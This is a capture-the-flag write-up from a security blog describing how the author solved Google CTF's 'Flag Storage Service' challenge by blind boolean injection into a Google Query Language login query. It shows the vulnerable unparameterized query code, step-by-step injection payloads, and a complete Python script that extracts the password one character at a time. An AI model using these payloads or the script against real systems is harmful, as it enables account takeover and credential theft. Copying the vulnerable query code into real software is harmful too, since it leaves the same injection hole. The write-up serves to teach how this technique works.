---
source: zlz-buerhaus
source_url: https://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service/
title: "Google CTF – Web 11 – Flag Storage Service | ziot"
---

[< Back](https://buer.haus/)

**Google CTF - Web 11 - Flag Storage Service**

![site](https://buer.haus/wp-content/uploads/2016/05/site4.png)

A challenge involving injecting into Google's Query Language (GQL) using a blind boolean technique to extract a password from the database.

We get a website with no hints but looks exactly like Web 6 - Purple Wombats challenge. We already have the source code for the previous challenge, so we know that the source we retrieved earlier most likely has some hints for this challenge.

e.g. [https://github.com/mannequin-moments/](https://github.com/mannequin-moments/)

In the models.py we can see the incomplete login/authentication code that it wasn't using in the first challenge. After a quick check on this challenge, we know this code aligns with this site.

Beyond the source code, two important discoveries on the website are required to progress:

[https://next-bitter-flag.ctfcompetition.com/robots.txt](https://next-bitter-flag.ctfcompetition.com/robots.txt)

```
User-agent: hackers
Disallow: /README.txt
Disallow: /sync
```

[https://next-bitter-flag.ctfcompetition.com/README.txt](https://next-bitter-flag.ctfcompetition.com/README.txt)

![readme](https://buer.haus/wp-content/uploads/2016/05/readme.png)

We now know a username: " **manager**"

I remembered looking at models.py and seeing that we have access to incomplete login code that wasn't implemented in the prior challenge:

```

@classmethod
def Login(cls, username, password):
    query = "SELECT * FROM User WHERE username = '%s'" % username
    if password is not None:
        query += " AND password = '%s'" % password
```

Three things are worth noting here:

1. You can inject into the query because it's not parameterized.
2. If you don't supply password, it's omit from the query. That aligns with what README.txt says further validating our guess that the source matches.
3. It's importing google.appengine.api and executing "qry = ndb.gql(query)".

Oh god. It's Google Query Language (GQL).

In my years of pen. testing, I've only ever seen a GQL injection once before and nothing was exploitable. I spent many hours researching it and determined that there may be that one site out there that is vulnerable to a GQL injection, but the language itself is designed to make it very difficult for a developer to accidentally implement it that way.

Moving forward.

First thing to test is the injection and see if we get any errors out.

![Step 2](https://buer.haus/wp-content/uploads/2016/05/Step-2.png)

The next thing I thought was: "If they're not checking password in the query, we can just login with manager?"

![Step 3](https://buer.haus/wp-content/uploads/2016/05/Step-3.png)

Nope, there must be another query checking password. This at least validates that the "manager" user exists because it's throwing an invalid password error instead of invalid username/password.

Ok cool, lets try all of our usual SQL injection techniques:

- or 1='1
- or 1=1/\*, --, # for commenting out the last '
- OR where username LIKE '%manager%'

Oh god, none of this exists in GQL.

I spent the next few hours looking over the GQL docs: [https://cloud.google.com/appengine/docs/python/datastore/gqlreference](https://cloud.google.com/appengine/docs/python/datastore/gqlreference)

I should have just searched Google immediately as any programmer would do looking for a tribal knowledge solution. The first result I got gave the answer we would need to solve it:

[http://stackoverflow.com/questions/47786/google-app-engine-is-it-possible-to-do-a-gql-like-query](http://stackoverflow.com/questions/47786/google-app-engine-is-it-possible-to-do-a-gql-like-query)

After reading this, the answer immediately clicked in my head. It's a sort of like a blind wildcard SQL injection where you query part of a string and get different results depending on if the substring or wildcard matches. For example, if the password begins with "a" and the next character is lower than "Z" we get error 1 otherwise we get error 2.

This relies on decimal ranges, so bust out a friendly ASCII chart if you need a reminder of the ranges: [http://www.asciitable.com/index/asciifull.gif](http://www.asciitable.com/index/asciifull.gif).

Here's an example request - if we send the following POST request:

- username=manager' AND password >='A' AND password < 'Z

We get the following: "Invalid password." (error 1)

![error1](https://buer.haus/wp-content/uploads/2016/05/error1.png)

So we continue to iterate through one character at a time.

- username=manager' AND password >='B' AND password < 'Z
- username=manager' AND password >='C' AND password < 'Z
- username=manager' AND password >='D' AND password < 'Z

When we hit "D" we land on a different error: "Invalid username/password." (error 2)

![error2](https://buer.haus/wp-content/uploads/2016/05/error2.png)

Because we hit a different error on D, we know that the query is no longer returning a valid result. So now we know that the first letter of the password is C because it's the ASCII character before D.

Continue again:

- username=manager' AND password >='CA' AND password < 'Z
- username=manager' AND password >='CB' AND password < 'Z
- ...
- username=manager' AND password >='CU' AND password < 'Z

Ok, now we know it's "CT". After I continued and got the password to "CTF{" is when I realized the manager's password was going to be the first flag. I decided to script this out because I didn't want to do it manually. I'm glad I did because the flag is super long and would have taken forever.

![Step 4](https://buer.haus/wp-content/uploads/2016/05/Step-4.png)

Flag:

CTF{,Why,did,the,grape,stop,in,the,middle,of,the,road---Because,he,ran,out,of,juice,}

This is also the password for the account, so after we capture the flag we move on to the next challenge!

The quick and janky "CTF quality" Python script I put together for this:

```

import random
import string
import pycurl
from io import BytesIO
import base64
import threading

def login(char):
    global password
    buffer = BytesIO()
    host_url = 'https://next-bitter-flag.ctfcompetition.com/login'
    c = pycurl.Curl()
    c.setopt(c.URL, host_url)
    c.setopt(pycurl.FOLLOWLOCATION, 1)
    c.setopt(pycurl.SSL_VERIFYPEER, 0);
    c.setopt(pycurl.COOKIEJAR, 'cookie.txt')
    c.setopt(pycurl.COOKIEFILE, 'cookie.txt')
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.POSTFIELDS, "username=manager' AND password >='"+password+""+char+"' AND password < 'z")
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    c.close()
    body = buffer.getvalue()
    return body

password = "C"

def getNextChar():
    char_min=33
    char_max=126

    for x in range(char_min, char_max):
        char = chr(x)
        body = login(char)
        if "Invalid username/password." in body:
            return chr((x-1))
    return False

while True:
    password+=getNextChar()
    print(password)

print "end"
```